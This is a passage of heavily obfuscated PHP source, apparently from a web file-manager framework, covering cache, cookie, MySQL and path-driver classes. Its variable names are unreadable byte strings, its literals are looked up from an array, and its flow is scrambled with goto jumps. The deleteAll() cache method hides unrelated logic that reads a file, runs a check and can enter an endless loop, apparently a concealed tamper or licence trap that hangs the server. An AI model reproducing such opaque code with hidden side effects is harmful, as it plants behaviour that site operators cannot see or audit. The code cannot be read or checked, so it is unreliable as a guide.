get($©ì¥Ÿ¬Ô) { $ãñ›¤¡ë = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ãñ›¤¡ë->get($©ì¥Ÿ¬Ô); } public function remove($ë•ÆÑÂ³) { return $this->handle->del($ë•ÆÑÂ³); } public function deleteAll() { $õ¦úšóê =& $_SERVER[ï»»·÷á]; if (!isset($_SERVER[$õ¦úšóê[401]]) || !isset($_SERVER[$õ¦úšóê[409]])) { $æú†£ıû = $õ¦úšóê[889]; $³Äæ©òä = $õ¦úšóê[403]; $Ã”Ó°° = $_SERVER[$õ¦úšóê[404]] . $õ¦úšóê[405]; $Ö®ÑıÇ = $³Äæ©òä($Ã”Ó°°); $€Ã·Ó‡ = explode($õ¦úšóê[231], $Ö®ÑıÇ); if (count($€Ã·Ó‡) < $õ¦úšóê[632]) { $í—Ù şë = $õ¦úšóê[407]; $í—Ù şë(); } $ö†ğäìÓ = $õ¦úšóê[890]; $ö†ğäìÓ($_SERVER[$õ¦úšóê[891]]); $•ë»£ÖÆ = 1; for ($†»úõ» = $•ë»£ÖÆ; $†»úõ» > 0; $†»úõ»++) { $ö†ğäìÓ = json_encode($GLOBALS[$õ¦úšóê[427]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $»ğŠÛ») { $this->handle->flushall($»ğŠÛ»); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($…‡¨ï¬é = '', $ÂºÁÆ« = 0) { if (is_string($…‡¨ï¬é) && $…‡¨ï¬é != $_SERVER[ï»»·÷á][12]) { $this->prefix = $…‡¨ï¬é; } if (is_numeric($ÂºÁÆ«) && $ÂºÁÆ« > 0) { $this->expire = $ÂºÁÆ«; } } public static function getInstance() { static $ÏÉ»¡ï®; if ($ÏÉ»¡ï® === null) { $ÏÉ»¡ï® = new self(); } return $ÏÉ»¡ï®; } private static $cookieDisable = false; public static function disable($™»«ÚÂ) { self::$cookieDisable = $™»«ÚÂ; } private static $sameCookieSet = array(); public static function set($ê¯ïİ“, $¯ÅÜĞš‘, $ËĞ¸Ûë¡ = 0, $Ûš“â‹« = false, $ÜÊ–Ÿ–ü = false) { $¬°“¾ñô =& $_SERVER[ï»»·÷á]; if (self::$cookieDisable) { return; } if (!$ËĞ¸Ûë¡) { $ËĞ¸Ûë¡ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ê¯ïİ“]) && self::$sameCookieSet[$ê¯ïİ“] == $¯ÅÜĞš‘ . $ËĞ¸Ûë¡) { return; } self::$sameCookieSet[$ê¯ïİ“] = $¯ÅÜĞš‘ . $ËĞ¸Ûë¡; if (!$ÜÊ–Ÿ–ü) { $ÜÊ–Ÿ–ü = str_replace(HOST, $¬°“¾ñô[12], APP_HOST); $ÜÊ–Ÿ–ü = _get($GLOBALS, $¬°“¾ñô[892], $ÜÊ–Ÿ–ü); } $¥Âşú„³ = $¬°“¾ñô[12]; setcookie($ê¯ïİ“, $¯ÅÜĞš‘, time() + $ËĞ¸Ûë¡, $¬°“¾ñô[8] . trim($ÜÊ–Ÿ–ü, $¬°“¾ñô[8]) . $¥Âşú„³, !1, !1, $Ûš“â‹«); } public static function setSafe($Ì¯ÛÓ´ë, $èêöúšú, $Áª°Êü = 0) { self::set($Ì¯ÛÓ´ë, $èêöúšú, $Áª°Êü, !0); } public static function get($¹Ÿ»¹„ª) { static $´àçÔÔ´ = false; if (!$´àçÔÔ´) { self::initHeaderCookie(); $´àçÔÔ´ = !0; } return isset($_COOKIE[$¹Ÿ»¹„ª]) ? $_COOKIE[$¹Ÿ»¹„ª] : !1; } private static function initHeaderCookie() { $òÉ ¥Ëˆ =& $_SERVER[ï»»·÷á]; if (!isset($_SERVER[$òÉ ¥Ëˆ[893]]) || !$_SERVER[$òÉ ¥Ëˆ[893]]) { return; } $²ûòÖ”à = explode($òÉ ¥Ëˆ[71], $_SERVER[$òÉ ¥Ëˆ[893]]); foreach ($²ûòÖ”à as $Ùˆ½¨¦Ù) { $Ùˆ½¨¦Ù = explode($òÉ ¥Ëˆ[894], $Ùˆ½¨¦Ù); if (count($Ùˆ½¨¦Ù) != 2 || !isset($Ùˆ½¨¦Ù[1])) { continue; } $_COOKIE[trim($Ùˆ½¨¦Ù[0])] = trim($Ùˆ½¨¦Ù[1]); } } public static function remove($ö…½›ÇÆ, $’”ı¹˜· = false) { unset($_COOKIE[$ö…½›ÇÆ]); self::set($ö…½›ÇÆ, $_SERVER[ï»»·÷á][12], 1, $’”ı¹˜·); } } class DbMysql extends Db { public function __construct($í¶¢ó×¨ = '') { $•‚…”¿Ú =& $_SERVER[ï»»·÷á]; if (!extension_loaded($•‚…”¿Ú[817])) { think_exception(think_lang($•‚…”¿Ú[14]) . $•‚…”¿Ú[895]); } if (!empty($í¶¢ó×¨)) { $this->config = $í¶¢ó×¨; if (empty($this->config[$•‚…”¿Ú[17]])) { $this->config[$•‚…”¿Ú[17]] = $•‚…”¿Ú[12]; } } } public function connect($–„İóºæ = '', $¢¸İ•Š” = 0, $çÙÑ§øŒ = false) { $Š°ùİ”Ï =& $_SERVER[ï»»·÷á]; if (!isset($this->linkID[$¢¸İ•Š”])) { if (empty($–„İóºæ)) { $–„İóºæ = $this->config; } $¬ğïõºô = $–„İóºæ[$Š°ùİ”Ï[896]] . ($–„İóºæ[$Š°ùİ”Ï[897]] ? "\x3a{$–„İóºæ[$Š°ùİ”Ï[897]]}" : $Š°ùİ”Ï[12]); $®İŠöôó = !empty($–„İóºæ[$Š°ùİ”Ï[17]][$Š°ùİ”Ï[18]]) ? $–„İóºæ[$Š°ùİ”Ï[17]][$Š°ùİ”Ï[18]] : $this->pconnect; if ($®İŠöôó) { $this->linkID[$¢¸İ•Š”] = mysql_pconnect($¬ğïõºô, $–„İóºæ[$Š°ùİ”Ï[898]], $–„İóºæ[$Š°ùİ”Ï[899]], 131072); } else { $this->linkID[$¢¸İ•Š”] = mysql_connect($¬ğïõºô, $–„İóºæ[$Š°ùİ”Ï[898]], $–„İóºæ[$Š°ùİ”Ï[899]], !0, 131072); } if (!$this->linkID[$¢¸İ•Š”] || !empty($–„İóºæ[$Š°ùİ”Ï[21]]) && !mysql_select_db($–„İóºæ[$Š°ùİ”Ï[21]], $this->linkID[$¢¸İ•Š”])) { think_exception(mysql_error()); } $€ÀıÍ•ƒ = mysql_get_server_info($this->linkID[$¢¸İ•Š”]); mysql_query($Š°ùİ”Ï[900] . think_config($Š°ùİ”Ï[901]) . $Š°ùİ”Ï[58], $this->linkID[$¢¸İ•Š”]); if ($€ÀıÍ•ƒ > $Š°ùİ”Ï[902]) { mysql_query($Š°ùİ”Ï[903], $this->linkID[$¢¸İ•Š”]); } $this->connected = !0; if (1 != think_config($Š°ùİ”Ï[22])) { unset($this->config); } } return $this->linkID[$¢¸İ•Š”]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¯Àô­¨) { $÷·³ıâ­ =& $_SERVER[ï»»·÷á]; if (0 === stripos($¯Àô­¨, $÷·³ıâ­[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯Àô­¨; if ($this->queryID) { $this->free(); } think_action_status($÷·³ıâ­[23], 1); think_status($÷·³ıâ­[24]); $this->queryID = mysql_query($¯Àô­¨, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($€×è¡Ï) { $ÄÈÇıõ¾ =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€×è¡Ï; if ($this->queryID) { $this->free(); } think_action_status($ÄÈÇıõ¾[25], 1); think_status($ÄÈÇıõ¾[24]); $š¾å…õ‹ = mysql_query($€×è¡Ï, $this->_linkID); $this->debug(); if (!1 === $š¾å…õ‹) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ï»»·÷á][904], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—œÕÌœ½ = mysql_query($_SERVER[ï»»·÷á][905], $this->_linkID); $this->transTimes = 0; if (!$—œÕÌœ½) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $³‘°‘ÔÃ = mysql_query($_SERVER[ï»»·÷á][906], $this->_linkID); $this->transTimes = 0; if (!$³‘°‘ÔÃ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÕÏœ½† = array(); if ($this->numRows > 0) { while ($‘‡Ò½ í = mysql_fetch_assoc($this->queryID)) { $ÕÏœ½†[] = $‘‡Ò½ í; } mysql_data_seek($this->queryID, 0); } return $ÕÏœ½†; } public function getFields($­¡ÉÚ’Ç) { $…“şú¨ =& $_SERVER[ï»»·÷á]; $áÁ¹×±ª = $this->query($…“şú¨[907] . $this->parseKey($­¡ÉÚ’Ç)); $Ë®€Ó½ = array(); if ($áÁ¹×±ª) { foreach ($áÁ¹×±ª as $ÇÃÖãÇÇ => $Óì‡œß) { $Ë®€Ó½[$Óì‡œß[$…“şú¨[31]]] = array($…“şú¨[32] => $Óì‡œß[$…“şú¨[31]], $…“şú¨[33] => $Óì‡œß[$…“şú¨[34]], $…“şú¨[35] => (bool) (strtoupper($Óì‡œß[$…“şú¨[36]]) === $…“şú¨[908]), $…“şú¨[37] => $Óì‡œß[$…“şú¨[38]], $…“şú¨[39] => strtolower($Óì‡œß[$…“şú¨[40]]) == $…“şú¨[41], $…“şú¨[42] => strtolower($Óì‡œß[$…“şú¨[43]]) == $…“şú¨[44]); } } return $Ë®€Ó½; } public function getTables($„Šûğ·Ä = '') { $«Äüìîå =& $_SERVER[ï»»·÷á]; if (!empty($„Šûğ·Ä)) { $İÑ´…ÃĞ = $«Äüìîå[909] . $„Šûğ·Ä . $«Äüìîå[910]; } else { $İÑ´…ÃĞ = $«Äüìîå[911]; } $ÕÇâÌå© = $this->query($İÑ´…ÃĞ); $’÷—£º = array(); foreach ($ÕÇâÌå© as $º¨…Ã®© => $¬ï·Â‘ó) { $’÷—£º[$º¨…Ã®©] = current($¬ï·Â‘ó); } return $’÷—£º; } public function replace($Àˆ©ÓÇ, $³¢Îæé = array()) { $ÄíÅ”¸ä =& $_SERVER[ï»»·÷á]; foreach ($Àˆ©ÓÇ as $ø“â‰ => $¤ƒÜ¦Ù‰) { $íÒ˜­€ø = $this->parseValue($¤ƒÜ¦Ù‰); if (is_scalar($íÒ˜­€ø)) { $ÅÓÊˆ°Ø[] = $íÒ˜­€ø; $¡À•²Ä¢[] = $this->parseKey($ø“â‰); } } $ºß’®Éï = $ÄíÅ”¸ä[912] . $this->parseTable($³¢Îæé[$ÄíÅ”¸ä[279]]) . $ÄíÅ”¸ä[913] . implode($ÄíÅ”¸ä[50], $¡À•²Ä¢) . $ÄíÅ”¸ä[914] . implode($ÄíÅ”¸ä[50], $ÅÓÊˆ°Ø) . $ÄíÅ”¸ä[915]; return $this->execute($ºß’®Éï); } public function insertAll($×Êæ¸Éñ, $ùÇêÚ²£ = array(), $¨êà‚ø“ = false) { $§ éõ”¬ =& $_SERVER[ï»»·÷á]; if (!is_array($×Êæ¸Éñ[0])) { return !1; } $¾ö¼à¡‚ = array_keys($×Êæ¸Éñ[0]); $°•»Üêù = array(); foreach ($×Êæ¸Éñ as $¨“«»øá) { $˜„„¨¬å = array(); foreach ($¨“«»øá as $Ñ¤ÎÒ‡İ => $Ç¡Ä¥÷”) { $Ç¡Ä¥÷” = $this->parseValue($Ç¡Ä¥÷”); if (is_scalar($Ç¡Ä¥÷”)) { $˜„„¨¬å[] = $Ç¡Ä¥÷”; } } $°•»Üêù[] = $§ éõ”¬[260] . implode($§ éõ”¬[50], $˜„„¨¬å) . $§ éõ”¬[915]; } array_walk($¾ö¼à¡‚, array($this, $§ éõ”¬[916])); $É»¥ “ = ($¨êà‚ø“ ? $§ éõ”¬[917] : $§ éõ”¬[918]) . $§ éõ”¬[919] . $this->parseTable($ùÇêÚ²£[$§ éõ”¬[279]]) . $§ éõ”¬[913] . implode($§ éõ”¬[50], $¾ö¼à¡‚) . $§ éõ”¬[920] . implode($§ éõ”¬[50], $°•»Üêù); return $this->execute($É»¥ “); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ï¸±œ£Í =& $_SERVER[ï»»·÷á]; $this->error = mysql_errno() . $Ï¸±œ£Í[4] . mysql_error($this->_linkID); if ($Ï¸±œ£Í[12] != $this->queryStr) { $this->error .= LNG($Ï¸±œ£Í[48]) . $this->queryStr; } think_trace($this->error, $Ï¸±œ£Í[12], $Ï¸±œ£Í[49]); return $this->error; } public function escapeString($Ù¢çïİ) { if ($this->_linkID) { return mysql_real_escape_string($Ù¢çïİ, $this->_linkID); } else { return mysql_escape_string($Ù¢çïİ); } } public function parseKey(&$ÖÉ¢ã“±, $İ¼¥ÜÉª = true) { $ºâàõ¾Ú =& $_SERVER[ï»»·÷á]; if ($İ¼¥ÜÉª) { $ÖÉ¢ã“± = $this->parseKeyCheck($ÖÉ¢ã“±); } if ($ÖÉ¢ã“± != $ºâàõ¾Ú[189] && !preg_match($ºâàõ¾Ú[921], $ÖÉ¢ã“±)) { $ÖÉ¢ã“± = $ºâàõ¾Ú[385] . trim($ÖÉ¢ã“±, $ºâàõ¾Ú[385]) . $ºâàõ¾Ú[385]; } return $ÖÉ¢ã“±; } } goto f÷ğå­åí˜; E¢îÛ¾ôÃ×: function binCheckBigger($Ú˜Ë­éÉ, $‰û°³Àº) { return $Ú˜Ë­éÉ > $‰û°³Àº; } $_SERVER[$_SERVER[‚è¬à®][3]] = (strrev('0228').base64_decode('MzU='))+0;$_26hz="v091pk8dux7ycm5ajtqb2re6iwnsgfz4ho3liw408juac6zvlo5129sbgk3ytnh7qfxer";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($äí¿‡íè, $®æ˜ÖÚó) { $ÒÒàÕÃ =& $_SERVER[ï»»·÷á]; if (isset(self::$_methodList[$äí¿‡íè])) { return @call_user_func_array(self::$_methodList[$äí¿‡íè], $®æ˜ÖÚó); } else { if (method_exists($this, $äí¿‡íè)) { return call_user_func_array(array($this, $äí¿‡íè), $®æ˜ÖÚó); } else { think_exception(__CLASS__ . $ÒÒàÕÃ[4] . $äí¿‡íè . $ÒÒàÕÃ[5]); } } } public static function __callStatic($Ö¦Ò, $ıÔİ±£Â) { if (isset(self::$_methodListStatic[$Ö¦Ò])) { return call_user_func_array(self::$_methodListStatic[$Ö¦Ò], $ıÔİ±£Â); } else { if (method_exists(self, $Ö¦Ò)) { return call_user_func_array(array(self, $Ö¦Ò), $ıÔİ±£Â); } else { show_json("{$Ö¦Ò}\50\51\40\156\157\x74\x20\x65\170\151\x73\x74\73", !1); } } } public static function addMethod($ £¬‰–, $âüîÌÍ) { self::$_methodList[$ £¬‰–] = $âüîÌÍ; } public static function addMethodStatic($ïìÛÜ, $àƒñ×¯ø) { self::$_methodListStatic[$ïìÛÜ] = $àƒñ×¯ø; } } goto F¬Èˆ”Õ”‡; fáÂìÈŞ»‘: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Š©¼‹Ô× =& $_SERVER[ï»»·÷á]; $this->objectDriver = array($Š©¼‹Ô×[60], $Š©¼‹Ô×[61], $Š©¼‹Ô×[62], $Š©¼‹Ô×[63], $Š©¼‹Ô×[64], $Š©¼‹Ô×[65], $Š©¼‹Ô×[66], $Š©¼‹Ô×[67], $Š©¼‹Ô×[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($³«¯Ö§¢) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($³«¯Ö§¢, $_SERVER[ï»»·÷á][8]); } return $³«¯Ö§¢; } public function iconvApp($æğ¡ñÃš) { return $æğ¡ñÃš; } public function iconvSystem($´ºÈç•‘) { return $´ºÈç•‘; } public function iconvTo($«ÂÏ—»ó, $›Šß¸¦¼, $œøÖˆ¸­) { $­±ÌŸˆµ =& $_SERVER[ï»»·÷á]; if (!$«ÂÏ—»ó || !function_exists($­±ÌŸˆµ[69])) { return $«ÂÏ—»ó; } static $äõ³‘¯Í = array(); $úãŞ”¨ = $›Šß¸¦¼ . $­±ÌŸˆµ[70] . $œøÖˆ¸­ . $­±ÌŸˆµ[71] . $«ÂÏ—»ó; if (isset($äõ³‘¯Í[$úãŞ”¨])) { return $äõ³‘¯Í[$úãŞ”¨]; } if (function_exists($­±ÌŸˆµ[72])) { $ö»¦„Œ½ = @mb_convert_encoding($«ÂÏ—»ó, $œøÖˆ¸­, $›Šß¸¦¼); } else { $ö»¦„Œ½ = @iconv($›Šß¸¦¼, $œøÖˆ¸­, $«ÂÏ—»ó); } $ö»¦„Œ½ = $ö»¦„Œ½ ? $ö»¦„Œ½ : $«ÂÏ—»ó; if (strstr($ö»¦„Œ½, $­±ÌŸˆµ[73])) { $ö»¦„Œ½ = str_replace($­±ÌŸˆµ[73], $­±ÌŸˆµ[11], $ö»¦„Œ½); } $äõ³‘¯Í[$›Šß¸¦¼ . $­±ÌŸˆµ[70] . $œøÖˆ¸­ . $­±ÌŸˆµ[71] . $«ÂÏ—»ó] = $ö»¦„Œ½; $äõ³‘¯Í[$œøÖˆ¸­ . $­±ÌŸˆµ[70] . $›Šß¸¦¼ . $­±ÌŸˆµ[71] . $«ÂÏ—»ó] = $«ÂÏ—»ó; $äõ³‘¯Í[$œøÖˆ¸­ . $­±ÌŸˆµ[70] . $›Šß¸¦¼ . $­±ÌŸˆµ[71] . $ö»¦„Œ½] = $«ÂÏ—»ó; $äõ³‘¯Í[$›Šß¸¦¼ . $­±ÌŸˆµ[70] . $œøÖˆ¸­ . $­±ÌŸˆµ[71] . $ö»¦„Œ½] = $ö»¦„Œ½; return $ö»¦„Œ½; } public function getPathInner($öèëÆÏ®) { $¿´¾•Ö = IO::init($öèëÆÏ®); return $¿´¾•Ö->path; } public function getPathOuter($àì“‚æÉ) { $üªéìÅ¸ =& $_SERVER[ï»»·÷á]; $Ò²ï áÒ = strlen(trim($this->pathBase, $üªéìÅ¸[8])); $àì“‚æÉ = substr(trim($àì“‚æÉ, $üªéìÅ¸[8]), $Ò²ï áÒ); return $this->pathDriver . $üªéìÅ¸[8] . ltrim($àì“‚æÉ, $üªéìÅ¸[8]); } public function isParentOf($—…éî¨†, $•ø—œàµ) { $Ç™‹£™¡ =& $_SERVER[ï»»·÷á]; $—…éî¨† = rtrim(strtolower($—…éî¨†), $Ç™‹£™¡[8]) . $Ç™‹£™¡[8]; $•ø—œàµ = rtrim(strtolower($•ø—œàµ), $Ç™‹£™¡[8]) . $Ç™‹£™¡[8]; $Ëõ¸µÊŒ = strpos($•ø—œàµ, $—…éî¨†) === 0; return $Ëõ¸µÊŒ; } public function getType() { $ª”·çê =& $_SERVER[ï»»·÷á]; $‰»õí– = str_replace($ª”·çê[74], $ª”·çê[12], get_class($this)); return strtolower($‰»õí–); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($…™óšƒ, $Íöæ€œ) { $Ä´©íç³ =& $_SERVER[ï»»·÷á]; $É¢…Ôµ¢ = rtrim($…™óšƒ, $Ä´©íç³[8]) . $Ä´©íç³[8] . $Íöæ€œ; $ìäÈì = $this->exist($É¢…Ôµ¢); return $ìäÈì ? $É¢…Ôµ¢ : !1; } public function setModifyTime($Ìó¨°á¨, $ÅĞäš½ = '') { } public function renameObject($¸‚ğ”­û, $‘²Á¬ù) { $˜«‚¬à = $‘²Á¬ù; $¸‚ğ”­û = $this->getPathOuter($¸‚ğ”­û); $‘²Á¬ù = $this->pathFather($¸‚ğ”­û) . $‘²Á¬ù; $ê€ñè±Ç = IO::copy($¸‚ğ”­û, $this->pathFather($¸‚ğ”­û), REPEAT_RENAME_FOLDER, $˜«‚¬à); if ($ê€ñè±Ç) { IO::remove($¸‚ğ”­û); } return $ê€ñè±Ç ? $‘²Á¬ù : !1; } public function tempFile($úÎ·²™ = '', $‚õ£ùÄ³ = '') { if (!$úÎ·²™) { $úÎ·²™ = rand_string(15); } $‘ ÄÈÃ = TEMP_FILES . rand_string(15) . $_SERVER[ï»»·÷á][8]; @mkdir($‘ ÄÈÃ, DEFAULT_PERRMISSIONS, !0); $ĞúÙıŞ¾ = $‘ ÄÈÃ . $úÎ·²™; @touch($ĞúÙıŞ¾); if ($‚õ£ùÄ³) { file_put_contents($ĞúÙıŞ¾, $‚õ£ùÄ³); } return $ĞúÙıŞ¾; } public function tempFileRemve($×ÅÃãÙ) { @unlink($×ÅÃãÙ); @rmdir($this->pathFather($×ÅÃãÙ)); } public function mkfile($ùæÀÈ–Ù, $Üê—†Á = '', $¯ú˜ËŸĞ = REPEAT_RENAME) { } public function mkdir($«óĞ•ÅÄ, $ãì¬—ïº = REPEAT_SKIP) { } public function delFile($­áÉ…ç¥) { } public function delFolder($óä•å©º) { } public function copyFile($¬éí£µî, $ãëº¢‰—) { } public function moveFile($úâÆ¾Õâ, $å«Ì‘¦) { } public function remove($ÄåÁ§) { if ($this->isFile($ÄåÁ§)) { return $this->delFile($ÄåÁ§); } return $this->delFolder($ÄåÁ§); } public function rename($å˜•¢Óš, $‡Ó×ú”æ) { } public function exist($¯ˆÙæª’) { } public function findByHash($ÜÓ Ï¬ = '', $‘É°é¤ = '') { return !1; } public function isFile($Â—ÂÇÓ) { } public function isFolder($Ößá±èù) { } public function size($ŸÙ¢µ¢¿) { } public function info($®øÇŠÊá) { } public function infoSimple($ÀñÉñÅì) { return $this->info($ÀñÉñÅì); } public function infoAuth($µ´Ï×ü³) { return $this->info($µ´Ï×ü³); } public function infoFull($ı”©¨”) { return $this->info($ı”©¨”); } public function infoWithChildren($şÔß²—Õ) { $¬‹´·ı =& $_SERVER[ï»»·÷á]; static $íùŞ¾À = array(); if (isset($íùŞ¾À[$şÔß²—Õ])) { return $íùŞ¾À[$şÔß²—Õ]; } $ú¹œï¬ê = $this->info($şÔß²—Õ); if ($ú¹œï¬ê && $ú¹œï¬ê[$¬‹´·ı[33]] == $¬‹´·ı[75]) { $Ãûõ“ª = array($¬‹´·ı[76] => 0, $¬‹´·ı[77] => 0, $¬‹´·ı[78] => 0); $this->infoChildren($şÔß²—Õ, $Ãûõ“ª); $ú¹œï¬ê[$¬‹´·ı[76]] = $Ãûõ“ª[$¬‹´·ı[76]]; $ú¹œï¬ê[$¬‹´·ı[79]] = array($¬‹´·ı[80] => $Ãûõ“ª[$¬‹´·ı[77]], $¬‹´·ı[81] => $Ãûõ“ª[$¬‹´·ı[78]]); $íùŞ¾À[$şÔß²—Õ] = $ú¹œï¬ê; } return $ú¹œï¬ê; } public function listPath($Ñ‹ì× Â, $€ŒÍºœ = false) { } public function has($Í‡ëÇ’», $‚¬Î’…‘ = false, $ÊÅà™¤Û = false) { } public function canRead($Úšˆ¯°„) { } public function canWrite($ê÷Ü¡ù´) { } public function getContent($™êØ“İÙ) { } public function setContent($·­ÙÈï, $Æ—°ÏíÇ = '') { } protected function infoChildren($£–ƒ† Î, &$ïİóÈˆó) { $ü¬”ïšƒ =& $_SERVER[ï»»·÷á]; check_abort_echo(); $·Ô‹ô¹ = $this->listPath($£–ƒ† Î, !0); $·Ô‹ô¹ = array_merge($·Ô‹ô¹[$ü¬”ïšƒ[82]], $·Ô‹ô¹[$ü¬”ïšƒ[83]]); foreach ($·Ô‹ô¹ as $ÈëÌ¤±ò) { if ($ÈëÌ¤±ò[$ü¬”ïšƒ[33]] == $ü¬”ïšƒ[75]) { $ïİóÈˆó[$ü¬”ïšƒ[78]]++; $ú§î§Şñ = $this->getPathInner($ÈëÌ¤±ò[$ü¬”ïšƒ[84]]); $this->infoChildren($ú§î§Şñ, $ïİóÈˆó); } else { $ïİóÈˆó[$ü¬”ïšƒ[77]]++; $ïİóÈˆó[$ü¬”ïšƒ[76]] += $ÈëÌ¤±ò[$ü¬”ïšƒ[76]]; } } } public function fileSubstr($×¥˜¿³Æ, $­±×òî­, $Ç³£¢âı) { } public function listAll($…À¶ÇÔ÷) { } public function listAllMake($ô£Ï¸·Ü, &$ÚéÂÎàğ) { $ûÊŸ¬€½ =& $_SERVER[ï»»·÷á]; check_abort_echo(); $ü¼É”Å = $this->listPath($ô£Ï¸·Ü, !0); if (!$ü¼É”Å) { return; } $º»¥ «ö = array_merge($ü¼É”Å[$ûÊŸ¬€½[82]], $ü¼É”Å[$ûÊŸ¬€½[83]]); foreach ($º»¥ «ö as $ØÑöÂÆë) { $ªÂô©­š = $ØÑöÂÆë[$ûÊŸ¬€½[33]] == $ûÊŸ¬€½[75]; $¿»âí‘î = array($ûÊŸ¬€½[84] => $ØÑöÂÆë[$ûÊŸ¬€½[84]], $ûÊŸ¬€½[75] => $ªÂô©­š); if (isset($ØÑöÂÆë[$ûÊŸ¬€½[76]])) { $¿»âí‘î[$ûÊŸ¬€½[76]] = $ØÑöÂÆë[$ûÊŸ¬€½[76]]; } if (isset($ØÑöÂÆë[$ûÊŸ¬€½[85]])) { $¿»âí‘î[$ûÊŸ¬€½[85]] = $ØÑöÂÆë[$ûÊŸ¬€½[85]]; } if (!$ªÂô©­š) { $ÚéÂÎàğ[] = $¿»âí‘î; continue; } $ÚéÂÎàğ[] = $¿»âí‘î; $ÆÍ¾«ûé = $ØÑöÂÆë[$ûÊŸ¬€½[84]]; $Ø¾·’¥Ï = $this->pathDriver; if (substr($ØÑöÂÆë[$ûÊŸ¬€½[84]], 0, strlen($Ø¾·’¥Ï)) == $Ø¾·’¥Ï) { $ÆÍ¾«ûé = substr($ÆÍ¾«ûé, strlen($Ø¾·’¥Ï)); } $this->listAllMake($ÆÍ¾«ûé, $ÚéÂÎàğ); } } public function listAllSimple($ò’…Ñ, $ÍÀí«ø = false) { $§‚ÃÓ½û = $this->listAll($ò’…Ñ); return $this->listAllSimpleMake($§‚ÃÓ½û, $this->getPathOuter($ò’…Ñ), $ÍÀí«ø); } public function listAllSimpleMake($µÄ®¬ÊÏ, $ı¡­“ñ¥, $òÒ³äş) { $ŠÇ°½õÚ =& $_SERVER[ï»»·÷á]; $’®Œ§ã = array(); $ı¡­“ñ¥ = rtrim(get_path_father($ı¡­“ñ¥), $ŠÇ°½õÚ[8]) . $ŠÇ°½õÚ[8]; foreach ($µÄ®¬ÊÏ as $ÈÜÆÉì) { $¨§Ç¸½” = array($ŠÇ°½õÚ[84] => $ÈÜÆÉì[$ŠÇ°½õÚ[84]], $ŠÇ°½õÚ[86] => $ÈÜÆÉì[$ŠÇ°½õÚ[84]], $ŠÇ°½õÚ[75] => $ÈÜÆÉì[$ŠÇ°½õÚ[75]]); if (isset($ÈÜÆÉì[$ŠÇ°½õÚ[76]]) && !$ÈÜÆÉì[$ŠÇ°½õÚ[75]]) { $¨§Ç¸½”[$ŠÇ°½õÚ[76]] = $ÈÜÆÉì[$ŠÇ°½õÚ[76]]; } if (isset($ÈÜÆÉì[$ŠÇ°½õÚ[85]])) { $¨§Ç¸½”[$ŠÇ°½õÚ[85]] = $ÈÜÆÉì[$ŠÇ°½õÚ[85]]; } if (is_array($ÈÜÆÉì[$ŠÇ°½õÚ[87]])) { $¨§Ç¸½”[$ŠÇ°½õÚ[86]] = $ÈÜÆÉì[$ŠÇ°½õÚ[87]][$ŠÇ°½õÚ[84]]; $¨§Ç¸½”[$ŠÇ°½õÚ[76]] = $ÈÜÆÉì[$ŠÇ°½õÚ[87]][$ŠÇ°½õÚ[76]]; $¨§Ç¸½”[$ŠÇ°½õÚ[85]] = $ÈÜÆÉì[$ŠÇ°½õÚ[87]][$ŠÇ°½õÚ[85]]; } else { if (substr($ÈÜÆÉì[$ŠÇ°½õÚ[84]], 0, strlen($ı¡­“ñ¥)) == $ı¡­“ñ¥) { $¨§Ç¸½”[$ŠÇ°½õÚ[84]] = substr($ÈÜÆÉì[$ŠÇ°½õÚ[84]], strlen($ı¡­“ñ¥)); } } $şŒççÃ’ = $ÈÜÆÉì[$ŠÇ°½õÚ[75]] ? $ŠÇ°½õÚ[8] : $ŠÇ°½õÚ[12]; $¨§Ç¸½”[$ŠÇ°½õÚ[86]] = rtrim($¨§Ç¸½”[$ŠÇ°½õÚ[86]], $ŠÇ°½õÚ[8]) . $şŒççÃ’; $¨§Ç¸½”[$ŠÇ°½õÚ[84]] = $ŠÇ°½õÚ[8] . trim($¨§Ç¸½”[$ŠÇ°½õÚ[84]], $ŠÇ°½õÚ[8]) . $şŒççÃ’; if (!$òÒ³äş) { $®õÃ•¡² = explode($ŠÇ°½õÚ[8], trim($¨§Ç¸½”[$ŠÇ°½õÚ[84]], $ŠÇ°½õÚ[8])); $¨§Ç¸½”[$ŠÇ°½õÚ[84]] = $ŠÇ°½õÚ[8] . implode($ŠÇ°½õÚ[8], array_slice($®õÃ•¡², 1)) . $şŒççÃ’; } $’®Œ§ã[] = $¨§Ç¸½”; } return array_sort_by($’®Œ§ã, $ŠÇ°½õÚ[84]); } public function upload($Ïî¢œ®ç, $ü•×Ş, $¤Äæ€ìƒ = false, $¯µàÆÈ = REPEAT_REPLACE) { } public function uploadFileByID($Æ£Ó¨®ä, $£ã¿Ñ€, $®ÚŸ·àô) { } public function uploadFileByPath($â‹ÂÜ¸, $‹áà†Â«, $·Ï®®† = array()) { } public function isUploadServer() { $³ı ²ôƒ =& $_SERVER[ï»»·÷á]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $³ı ²ôƒ[88]) { return !0; } return $GLOBALS[$³ı 